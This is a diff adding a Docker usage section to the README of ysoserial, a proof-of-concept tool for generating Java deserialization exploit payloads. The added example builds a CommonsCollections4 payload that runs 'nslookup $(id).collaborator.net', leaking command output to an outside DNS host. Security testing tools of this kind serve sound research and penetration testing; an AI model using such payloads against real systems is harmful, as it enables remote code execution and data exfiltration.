@@ -12,6 +12,19 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 ## Description
 
+## Updated Dockerfile 
+
+Fixed errors. Now run this commands to execute ysoserial on docker
+
+```bash
+docker build . -t ysoserial  
+```
+
+```bash
+docker run ysoserial:latest CommonsCollections4 'nslookup $(id).collaborator.net' | base64 -w 0
+```
+
+
 Originally released as part of AppSecCali 2015 Talk
 ["Marshalling Pickles: how deserializing objects will ruin your day"](
         https://frohoff.github.io/appseccali-marshalling-pickles/)
